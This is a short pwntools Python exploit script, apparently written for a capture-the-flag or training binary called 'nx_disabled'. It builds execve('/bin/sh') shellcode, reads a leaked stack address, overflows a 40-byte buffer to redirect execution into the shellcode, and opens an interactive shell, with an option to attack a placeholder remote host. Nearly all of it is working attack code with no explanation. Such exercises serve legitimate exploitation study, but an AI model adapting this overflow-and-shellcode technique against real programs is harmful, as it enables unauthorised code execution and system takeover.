#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("../nx_disabled")

gs = '''
b *main+105
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses
win = 0x4011b6

# Functions

io = start()

io.recvline
shellcode = asm('\n'.join([
    'mov rax, 0x3b',
    'xor rsi, rsi',
    'xor rdx, rdx',
    'mov rbx, 0x0068732f6e69622f',
    'push rbx',
    'mov rdi, rsp',
    'syscall',
]))
print("Shellcode len: ", len(shellcode))

io.recvuntil(b"Stack leak: 0x")
leak = io.recvline().strip(b"\n")
leak = int(leak, 16)
target = leak - 32
log.info("Stack leak: %s" % hex(leak))
log.info("Targeting: %s" % hex(target))

io.recvuntil(b">>")
offset = 40
p = shellcode
pad = offset - len(p)
p += b"\x00" * pad
p += p64(target)
io.send(p)

io.interactive()
